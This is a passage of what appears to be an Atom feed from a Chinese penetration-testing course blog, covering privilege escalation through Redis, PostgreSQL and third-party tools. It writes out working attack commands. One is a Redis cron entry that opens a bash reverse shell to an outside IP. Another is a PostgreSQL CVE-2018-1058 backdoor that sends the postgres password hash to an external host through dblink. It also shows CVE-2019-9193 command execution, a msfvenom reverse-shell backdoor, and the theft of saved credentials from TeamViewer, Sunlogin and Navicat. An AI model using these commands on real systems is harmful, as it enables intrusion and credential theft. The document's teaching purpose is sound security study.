src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420163625006.png" alt="image-20230420163625006"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%8</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day100 权限提升-数据库&amp;Redis&amp;Postgre&amp;第三方软件&amp;TV&amp;向日葵&amp;服务类</title>
    <link href="http://example.com/2023/04/17/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/"/>
    <id>http://example.com/2023/04/17/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/</id>
    <published>2023-04-17T02:36:23.000Z</published>
    <updated>2023-04-23T08:20:29.965Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230423162019514.png" alt="image-20230423162019514"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、数据库提权-Redis&amp;PostgreSQL等</p><p>2、第三方提权-TV&amp;向日葵&amp;Navicat等</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-数据库-Redis数据库权限提升-计划任务"><a href="#➢-数据库-Redis数据库权限提升-计划任务" class="headerlink" title="➢ 数据库-Redis数据库权限提升-计划任务"></a>➢ 数据库-Redis数据库权限提升-计划任务</h4><h4 id="➢-数据库-PostgreSQL数据库权限提升-漏洞"><a href="#➢-数据库-PostgreSQL数据库权限提升-漏洞" class="headerlink" title="➢ 数据库-PostgreSQL数据库权限提升-漏洞"></a>➢ 数据库-PostgreSQL数据库权限提升-漏洞</h4><h4 id="➢-三方应用-Teamviewer-amp-向日葵-amp-Navivat-凭据"><a href="#➢-三方应用-Teamviewer-amp-向日葵-amp-Navivat-凭据" class="headerlink" title="➢ 三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据"></a>➢ 三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据</h4></blockquote><h3 id="数据库-Redis数据库权限提升-计划任务"><a href="#数据库-Redis数据库权限提升-计划任务" class="headerlink" title="#数据库-Redis数据库权限提升-计划任务"></a>#数据库-Redis数据库权限提升-计划任务</h3><h5 id="连接-未授权或有密码-利用如下方法提权"><a href="#连接-未授权或有密码-利用如下方法提权" class="headerlink" title="连接(未授权或有密码)-利用如下方法提权"></a>连接(未授权或有密码)-利用如下方法提权</h5><h5 id="采用未授权直接利用，密码进入需获取配置文件读取"><a href="#采用未授权直接利用，密码进入需获取配置文件读取" class="headerlink" title="采用未授权直接利用，密码进入需获取配置文件读取"></a>采用未授权直接利用，密码进入需获取配置文件读取</h5><p><a href="https://www.cnblogs.com/zpchcbd/p/11739232.html">redis提权 - zpchcbd - 博客园 (cnblogs.com)</a></p><h6 id="1、设置键值为反弹命令的计划任务写法"><a href="#1、设置键值为反弹命令的计划任务写法" class="headerlink" title="1、设置键值为反弹命令的计划任务写法"></a>1、设置键值为反弹命令的计划任务写法</h6><h6 id="2、设置写入目录为-x2F-var-x2F-spool-x2F-cron-x2F"><a href="#2、设置写入目录为-x2F-var-x2F-spool-x2F-cron-x2F" class="headerlink" title="2、设置写入目录为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;"></a>2、设置写入目录为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;</h6><h6 id="3、设置写入文件名为xiaodi"><a href="#3、设置写入文件名为xiaodi" class="headerlink" title="3、设置写入文件名为xiaodi"></a>3、设置写入文件名为xiaodi</h6><h6 id="4、保存执行"><a href="#4、保存执行" class="headerlink" title="4、保存执行"></a>4、保存执行</h6><ul><li>set x “\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.114.103.63&#x2F;7788 0&gt;&amp;1\n”</li><li>config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</li><li>config set dbfilename xiaodi</li><li>save</li></ul><p>参考：<a href="https://blog.csdn.net/fly_hps/article/details/80937837">https://blog.csdn.net/fly_hps/article/details/80937837</a></p><h6 id="1-利用计划任务执行命令反弹shell"><a href="#1-利用计划任务执行命令反弹shell" class="headerlink" title="(1).利用计划任务执行命令反弹shell"></a>(1).利用计划任务执行命令反弹shell</h6><h6 id="2-写ssh-keygen公钥然后使用私钥登陆"><a href="#2-写ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="(2).写ssh-keygen公钥然后使用私钥登陆"></a>(2).写ssh-keygen公钥然后使用私钥登陆</h6><h6 id="3-权限较低往web物理路径写webshell"><a href="#3-权限较低往web物理路径写webshell" class="headerlink" title="(3).权限较低往web物理路径写webshell"></a>(3).权限较低往web物理路径写webshell</h6><p>修复方案：</p><p>注意：以下操作，均需重启 Redis 后才能生效。</p><p>绑定需要访问数据库的IP。 将127.0.0.1修改为需要访问此数据库的IP地址。</p><p>设置访问密码。在 Redis.conf中requirepass 字段后，设置添加访问密码。</p><p>修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。</p><h3 id="数据库-PostgreSQL数据库权限提升-漏洞"><a href="#数据库-PostgreSQL数据库权限提升-漏洞" class="headerlink" title="#数据库-PostgreSQL数据库权限提升-漏洞"></a>#数据库-PostgreSQL数据库权限提升-漏洞</h3><h6 id="PostgreSQL是一款关系型数据库。其9-3到11版本中存在一处“特性”，管理员或具有“COPY-TO-x2F-FROM-PROGRAM”权限的用户，可以使用这个特性执行任意命令。"><a href="#PostgreSQL是一款关系型数据库。其9-3到11版本中存在一处“特性”，管理员或具有“COPY-TO-x2F-FROM-PROGRAM”权限的用户，可以使用这个特性执行任意命令。" class="headerlink" title="PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。"></a>PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。</h6><h6 id="提权利用的是漏洞：CVE-2018-1058-CVE-2019-9193"><a href="#提权利用的是漏洞：CVE-2018-1058-CVE-2019-9193" class="headerlink" title="提权利用的是漏洞：CVE-2018-1058 CVE-2019-9193"></a>提权利用的是漏洞：CVE-2018-1058 CVE-2019-9193</h6><h6 id="连接-利用漏洞-执行-提权"><a href="#连接-利用漏洞-执行-提权" class="headerlink" title="连接-利用漏洞-执行-提权"></a>连接-利用漏洞-执行-提权</h6><p>参考：<a href="https://vulhub.org/#/environments/postgres/">https://vulhub.org/#/environments/postgres/</a></p><h6 id="修复方案：升级版本或打上补丁"><a href="#修复方案：升级版本或打上补丁" class="headerlink" title="修复方案：升级版本或打上补丁"></a>修复方案：升级版本或打上补丁</h6><h5 id="1、CVE-2018-1058"><a href="#1、CVE-2018-1058" class="headerlink" title="1、CVE-2018-1058"></a>1、CVE-2018-1058</h5><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420091143241.png" alt="image-20230420091143241"></p><h5 id="普通用户植入后门命令"><a href="#普通用户植入后门命令" class="headerlink" title="普通用户植入后门命令"></a>普通用户植入后门命令</h5><p>CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$</p><p>​    select dblink_connect((select ‘hostaddr&#x3D;47.114.103.63 port&#x3D;5433 user&#x3D;postgres password&#x3D;chybeta sslmode&#x3D;disable dbname&#x3D;’||(SELECT passwd FROM pg_shadow WHERE usename&#x3D;’postgres’))); </p><p>​    SELECT pg_catalog.array_to_string($1,$2);</p><p>$$ LANGUAGE SQL VOLATILE;</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420091537800.png" alt="image-20230420091537800"></p><h5 id="管理员操作数据库触发"><a href="#管理员操作数据库触发" class="headerlink" title="管理员操作数据库触发"></a>管理员操作数据库触发</h5><p>docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420091634457.png" alt="image-20230420091634457"></p><p>监听获取到了反弹的shell</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420091712682.png" alt="image-20230420091712682"></p><h5 id="2、-CVE-2019-9193（无需管理员操作）"><a href="#2、-CVE-2019-9193（无需管理员操作）" class="headerlink" title="2、-CVE-2019-9193（无需管理员操作）"></a>2、-CVE-2019-9193（无需管理员操作）</h5><p>获得管理员用户</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420092500836.png" alt="image-20230420092500836"></p><p>DROP TABLE IF EXISTS cmd_exec;</p><p>CREATE TABLE cmd_exec(cmd_output text);</p><p>COPY cmd_exec FROM PROGRAM ‘id’;</p><p>SELECT * FROM cmd_exec;</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420092114303.png" alt="image-20230420092114303"></p><p>更改id就行</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420092424040.png" alt="image-20230420092424040"></p><h3 id="三方应用-Teamviewer-amp-向日葵-amp-Navivat-凭据"><a href="#三方应用-Teamviewer-amp-向日葵-amp-Navivat-凭据" class="headerlink" title="#三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据"></a>#三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据</h3><p><a href="https://blog.csdn.net/weixin_53009585/article/details/129098656">【权限提升】利用第三方应用Teamviewer&amp;向日葵&amp;Navivat-凭据_teamviewer管理员权限_今天是 几 号的博客-CSDN博客</a></p><p>远控类：Teamviewer 向日葵 Todesk VNC Radmin 等</p><p>密码类：各大浏览器 Xshell Navicat 3389 等</p><p>服务类：FileZilla Serv-u Zend等（这些软件基本不用了）</p><p>演示：</p><h5 id="1、用户：Teamviewer"><a href="#1、用户：Teamviewer" class="headerlink" title="1、用户：Teamviewer"></a>1、用户：Teamviewer</h5><h5 id="2、Web用户：向日葵"><a href="#2、Web用户：向日葵" class="headerlink" title="2、Web用户：向日葵"></a>2、Web用户：向日葵</h5><h5 id="3、用户：Navicat"><a href="#3、用户：Navicat" class="headerlink" title="3、用户：Navicat"></a>3、用户：Navicat</h5><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="1、向日葵"><a href="#1、向日葵" class="headerlink" title="1、向日葵"></a>1、向日葵</h5><h6 id="集成工具里面的cs有脚本插件"><a href="#集成工具里面的cs有脚本插件" class="headerlink" title="集成工具里面的cs有脚本插件"></a>集成工具里面的cs有脚本插件</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420093420395.png" alt="image-20230420093420395"></p><h6 id="上线后，先选择上传"><a href="#上线后，先选择上传" class="headerlink" title="上线后，先选择上传"></a>上线后，先选择上传</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420093708826.png" alt="image-20230420093708826"></p><h6 id="这里的上传目录最好是获得的网站权限的目录，因为别的目录可能因为权限而无法执行"><a href="#这里的上传目录最好是获得的网站权限的目录，因为别的目录可能因为权限而无法执行" class="headerlink" title="这里的上传目录最好是获得的网站权限的目录，因为别的目录可能因为权限而无法执行"></a>这里的上传目录最好是获得的网站权限的目录，因为别的目录可能因为权限而无法执行</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094015836.png" alt="image-20230420094015836"></p><h6 id="改为网站目录"><a href="#改为网站目录" class="headerlink" title="改为网站目录"></a>改为网站目录</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094047570.png" alt="image-20230420094047570"></p><h6 id="上传后点运行"><a href="#上传后点运行" class="headerlink" title="上传后点运行"></a>上传后点运行</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094201155.png" alt="image-20230420094201155"></p><h6 id="可以看到"><a href="#可以看到" class="headerlink" title="可以看到"></a>可以看到</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094229631.png" alt="image-20230420094229631"></p><h6 id="运行脚本，解密密文即可"><a href="#运行脚本，解密密文即可" class="headerlink" title="运行脚本，解密密文即可"></a>运行脚本，解密密文即可</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094347725.png" alt="image-20230420094347725"></p><h5 id="2、Teamviewer"><a href="#2、Teamviewer" class="headerlink" title="2、Teamviewer"></a>2、Teamviewer</h5><p>受害机上的Teamviewer的ID和密码</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420095701302.png" alt="image-20230420095701302"></p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.130.42 LPORT&#x3D;3333 -f exe -o msf.exe   #生成后门，将后门上传到网站</p><h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF:"></a>MSF:</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420101932138.png" alt="image-20230420101932138"></p><h6 id="获取到的密码和上面的一样"><a href="#获取到的密码和上面的一样" class="headerlink" title="获取到的密码和上面的一样"></a>获取到的密码和上面的一样</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102005940.png" alt="image-20230420102005940"></p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102432550.png" alt="image-20230420102432550"></p><h6 id="也能抓取，要本地用户权限"><a href="#也能抓取，要本地用户权限" class="headerlink" title="也能抓取，要本地用户权限"></a>也能抓取，要本地用户权限</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102450291.png" alt="image-20230420102450291"></p><h5 id="3、Navicat"><a href="#3、Navicat" class="headerlink" title="3、Navicat"></a>3、Navicat</h5><p>获取Navicat上的所有账号密码</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102946807.png" alt="image-20230420102946807"></p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102956932.png" alt="image-20230420102956932"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day99 权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF</title>
    <link href="http://example.com/2023/04/17/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/"/>
    <id>http://example.com/2023/04/17/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/</id>
    <published>2023-04-17T02:35:54.000Z</published>
    <updated>2023-05-05T14:01:42.834Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/881Zo_9-ppUN2L8qZb_fZQ.pngw=1280&h=1949.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、数据库账号密码获取方式</p><p>2、Mysql&amp;Mssql&amp;Oracle提权</p><p>3、数据库提权针对操作系统问题</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="Linux已复现第一篇："><a href="#Linux已复现第一篇：" class="headerlink" title="Linux已复现第一篇："></a>Linux已复现第一篇：</h4><h4 id="1、-Linux提权（mysql-UDF提权）-linux-mysql-udf提权-LZsec的博客-CSDN博客"><a href="#1、-Linux提权（mysql-UDF提权）-linux-mysql-udf提权-LZsec的博客-CSDN博客" class="headerlink" title="1、 Linux提权（mysql UDF提权）_linux mysql udf提权_LZsec的博客-CSDN博客"></a>1、<a href="https://blog.csdn.net/waxcj/article/details/128343131"> Linux提权（mysql UDF提权）_linux mysql udf提权_LZsec的博客-CSDN博客</a></h4><h4 id="2、Mysql提权-基于Mysql的UDF提权（Linux系统）-码小农的幸福生活-博客园"><a href="#2、Mysql提权-基于Mysql的UDF提权（Linux系统）-码小农的幸福生活-博客园" class="headerlink" title="2、Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 "></a>2、<a 